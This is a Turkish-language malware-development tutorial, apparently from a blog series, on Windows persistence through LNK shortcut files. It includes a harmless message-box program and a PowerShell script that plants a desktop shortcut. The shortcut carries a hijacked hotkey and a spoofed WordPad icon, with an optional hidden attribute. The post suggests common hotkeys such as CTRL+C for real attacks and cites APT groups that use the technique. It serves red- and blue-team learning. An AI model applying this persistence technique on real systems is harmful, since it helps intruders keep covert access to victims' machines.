\newpage
\subsection{89. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 23. LNK dosyaları. Basit PowerShell örneği.}

﷽

![pers](./images/112/2023-12-11_01-01_1.png){width="80%"}    

Bu gönderi, kötü amaçlı yazılımlarda kalıcılık sağlamak için kullanılabilecek en ilginç yöntemlerden biri olan **Windows LNK dosyaları** yöntemine dayanmaktadır.    

### LNK

[Microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943)'a göre, bir `LNK` dosyası, Windows'ta bir **kısayol** veya "bağlantı" görevi görerek bir dosyaya, klasöre veya uygulamaya referans sağlar. Normal kullanıcılar için bu dosyalar, dosya düzeni ve çalışma alanının düzenlenmesine yardımcı olur. Ancak, bir sıldırganın bakış açısından `LNK` dosyalarının önemi farklıdır. APT grupları tarafından belgelenmiş çeşitli sıldırılarda kullanılmıştır ve bildiğim kadaryla, kimlik avı, kalıcılık sağlama ve yüklenicileri çalıştırma gibi etkinlikler için halen geçerli bir seçenek olarak kalmaktadır.    

Windows kısayollarının çalıştırma açısından bir **kısayol tuşu** kullanarak kaydedilebileceğini biliyor muydunuz? Bu, bu durumda kötü amaçlı yazılımlar için kalıcılık sağlamak amacıyla kullanılan temel bir numaralardan biridir.    

### pratik örnek

Diyelim ki bir "kötü amaçlı yazılım" oluşturduk. Her zamanki gibi, `meow-meow` mesaj kutusu uygulaması `hack.c`:    

```cpp
/*
hack.c
Windows kalıcılık için kötü uygulama
yazar: @cocomelonc
https://cocomelonc.github.io/malware/2023/12/10/malware-pers-23.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
LPSTR lpCmdLine, int nCmdShow) {
  MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
  return 0;
}
```

Ardından, aşağıdaki özelliklere sahip bir `LNK` dosyası oluşturmak için PowerShell betiği oluşturalım:     

```powershell
# Masaüstünde oluşturulacak kısayolun yolunu tanımla
$shortcutPath = "$([Environment]::GetFolderPath('Desktop'))\Meow.lnk"

# WScript Shell nesnesi oluştur
$wshell = New-Object -ComObject Wscript.Shell

# Kısayol nesnesi oluştur
$shortcut = $wshell.CreateShortcut($shortcutPath)

# Kısayolun simge konumunu ayarla
$shortcut.IconLocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe"

# Kısayolun hedef yolunu ve argümanlarını ayarla
$shortcut.TargetPath = "Z:\2023-12-10-malware-pers-23\hack.exe"
$shortcut.Arguments = ""

# Kısayolun çalışma dizinini ayarla
$shortcut.WorkingDirectory = "Z:\2023-12-10-malware-pers-23"

# Kısayol için bir kısayol tuşu belirle (CTRL+W örneğin)
$shortcut.HotKey = "CTRL+W"

# Kısayol için açıklama ekle
$shortcut.Description = "Kötü amaçlı değil, meow-meow malware"

# Kısayolun pencere stilini ayarla (7 = Minimize edilmiş pencere)
$shortcut.WindowStyle = 7

# Kısayolu kaydet
$shortcut.Save()

# Opsiyonel olarak bağlantıyı gizli yapmak için 'Hidden' özelliğini ekleyin
# (Get-Item $shortcutPath).Attributes += 'Hidden'
```

Görebildiğiniz gibi, mantık oldukça basit. Masaüstünde belirli bir kısayol tuşu (CTRL+W) ile çalışan bir bağlantı oluşturuyoruz. Gerçek sıldırı senaryolarında bu, `CTRL+C`, `CTRL+V` veya `CTRL+P` gibi yaygın kombinasyonlar olabilir.    

Örneğin, eğer `Paint` için bir kısayol oluşturursanız, varsayılan olarak herhangi bir kısayol tuşu atanmaz:    

![pers](./images/112/2023-12-09_23-54.png){width="80%"}    

> Explorer, kısayol desteğini yalnızca **CTRL+ALT** ile başlayan komutlarla sınırlandırır. Ekstra kombinasyonlar yalnızca **COM** aracılığıyla programlanarak ayarlanabilir.    

### demo

Haydi her şeyi adım adım inceleyelim. "Kötü amaçlı yazılımımızı" derleyelim:      

```bash
x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/112/2023-12-11_01-28.png){width="80%"}    

Doğruluğunu kontrol etmek için çalıştıralım:    

```powershell
.\hack.exe
```

![pers](./images/112/2023-12-11_00-51.png){width="80%"}    

Ardından kalıcılık için PowerShell betiğimizi çalıştıralım:    

```powershell
Get-Content pers.ps1 | PowerShell.exe -noprofile -
```

![pers](./images/112/2023-12-11_00-57.png){width="80%"}    

Sonuç olarak, Meow LNK dosyası başarıyla oluşturuldu.    

Eğer özelliklerine bakarsak, her şey yolunda görünüyor:     

![pers](./images/112/2023-12-11_01-01.png){width="80%"}    

Son olarak, sadece çalıştırın ve `CTRL+W` kısayolunu tetiklemeyi deneyin:     

![pers](./images/112/2023-12-11_01-02.png){width="80%"}    

![pers](./images/112/2023-12-11_01-05.png){width="80%"}    

Görebildiğiniz gibi, her şey beklendiği gibi mükemmel çalıştı! =^..^= :)    

Bu teknik, **APT28** ([APT28](https://attack.mitre.org/groups/G0007/)), **APT29** ([APT29](https://attack.mitre.org/groups/G0016/)), **Kimsuky** ([Kimsuky](https://attack.mitre.org/groups/G0094/)) gibi APT grupları ve **Emotet** ([Emotet](https://attack.mitre.org/software/S0367/)) gibi zararlı yazılımlar tarafından aktif olarak kullanılmaktadır. Bu yöntem, kurbanları kandırmak için son derece kullanışlı olduğundan yaygın olarak tercih edilmektedir.     

Umarım bu gönderi, mavi takım üyelerinin bu teknik hakkında farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine bir silah ekler.      

Sevgili arkadaşım ve meslektaşım [Anton Kuznetsov](https://twitter.com/yrevichus)'a teşekkür ederim, bu tekniği bana hatırlattı ve harika bir sunum yaptı.     

[ATT&CK MITRE: T1204.001](https://attack.mitre.org/techniques/T1204/001/)     
[APT28](https://attack.mitre.org/groups/G0007/)    
[APT29](https://attack.mitre.org/groups/G0016/)     
[Kimsuky](https://attack.mitre.org/groups/G0094/)    
[Emotet](https://attack.mitre.org/software/S0367/)    
[MSDN: Shell Link (.LNK) Binary File Format](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943)     
[Malware persistence: part 1](https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html)       
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2023-12-10-malware-pers-23)     
